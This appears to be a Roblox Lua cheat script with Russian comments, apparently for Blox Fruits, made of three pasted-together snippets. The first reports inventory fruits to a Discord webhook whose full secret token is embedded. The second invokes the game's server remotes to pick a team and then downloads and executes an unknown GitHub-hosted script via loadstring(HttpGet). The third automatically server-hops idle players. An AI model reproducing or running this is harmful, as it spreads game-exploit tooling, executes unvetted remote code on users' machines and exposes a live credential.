local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local player = Players.LocalPlayer

local PROXY_URL = "https://discord.com/api/webhooks/1469730327617601880/E_2KCQuiMpbsp24Q27J9n2PKhj-a4nexepAs1rAfeYrnDgw2QHO5t1FBjTzuZqPF-Wgh"

-- Отправка только через RequestAsync
local function sendAlert(itemName)
    local message = {
        content = player.Name .. " получил '" .. itemName .. "'!",
        username = "Инвентарь"
    }
    local json = HttpService:JSONEncode(message)
    
    local success = pcall(function()
        HttpService:RequestAsync({
            Url = PROXY_URL,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = json
        })
    end)
    
    if success then
        print("Отправлено в Discord:", itemName)
    else
        warn("Ошибка отправки:", itemName)
    end
end

-- Проверка имени на наличие "Fruit"
local function checkItem(item)
    if item.Name:find("Fruit") then
        print("Найден фрукт:", item.Name)
        sendAlert(item.Name)
    end
end

-- Основное отслеживание
local function startTracking()
    local backpack = player:WaitForChild("Backpack")
    local character = player.Character or player.CharacterAdded:Wait()
    
    -- Новые предметы в инвентаре
    backpack.ChildAdded:Connect(function(item)
        task.wait(0.1)
        checkItem(item)
    end)
    
    -- Новые предметы в руках (только инструменты)
    character.ChildAdded:Connect(function(item)
        if item:IsA("Tool") then
            task.wait(0.1)
            checkItem(item)
        end
    end)
    
    print("Детектор фруктов запущен для", player.Name)
end

-- Запуск
if player.Character then
    task.wait(2)
    startTracking()
end
player.CharacterAdded:Connect(function()
    task.wait(2)
    startTracking()
end)

print("Скрипт запущен. Отслеживаю все фрукты.")

local replicatedStorage = game:GetService("ReplicatedStorage")
local player = game:GetService("Players").LocalPlayer

-- Ждём появления нужных объектов
local remotes = replicatedStorage:WaitForChild("Remotes")
local commF = remotes:WaitForChild("CommF_")

-- Выбор команды через InvokeServer (как в сниффере)
commF:InvokeServer("SetTeam", "Pirates")

-- Если игра требует дополнительный вызов (OnEventServiceActivity)
local modules = replicatedStorage:WaitForChild("Modules")
local eventService = modules:FindFirstChild("RE/OnEventServiceActivity")
if eventService then
    eventService:FireServer() -- без аргументов, если они не нужны
end

print("Команда Pirates выбрана")
loadstring(game:HttpGet("https://raw.githubusercontent.com/Huylovemy/Bearhudz/refs/heads/main/Bearhud.lua"))()
-- Получаем сервис для телепортации
local TeleportService = game:GetService("TeleportService")

-- Функция для перезахода (сервер-хоп)
local function serverHop(player)
    if player and player.Parent then
        print("Server hop for", player.Name, "due to idle Beli value")
        TeleportService:Teleport(game.PlaceId, player)
    end
end

-- Функция мониторинга значения Beli у игрока
local function monitorPlayer(player)
    -- Проверяем, что у игрока есть структура Data и объект Beli
    local data = player:FindFirstChild("Data")
    if not data then
        warn(player.Name, "has no 'Data' folder")
        return
    end
    
    local beli = data:FindFirstChild("Beli")
    if not beli or not (beli:IsA("NumberValue") or beli:IsA("IntValue")) then
        warn(player.Name, "has no 'Beli' NumberValue/IntValue in Data")
        return
    end
    
    local lastValue = beli.Value
    local lastChangeTime = os.time()
    
    -- Цикл наблюдения, пока игрок в игре
    while player.Parent do
        task.wait(1)  -- проверяем каждую секунду
        
        -- Игрок мог покинуть игру, повторная проверка
        if not player.Parent then break end
        
        local currentValue = beli.Value
        
        if currentValue ~= lastValue then
            -- Значение изменилось – сбрасываем таймер
            lastValue = currentValue
            lastChangeTime = os.time()
        elseif os.time() - lastChangeTime >= 30 then
            -- Прошло 30 секунд без изменений – выполняем сервер-хоп
            serverHop(player)
            break  -- выходим из цикла, так как игрок будет телепортирован
        end
    end
end

-- Запускаем мониторинг для всех уже существующих игроков
for _, player in ipairs(game:GetService("Players"):GetPlayers()) do
    task.spawn(monitorPlayer, player)
end

-- И для новых игроков, которые зайдут позже
game:GetService("Players").PlayerAdded:Connect(function(player)
    task.spawn(monitorPlayer, player)
end)
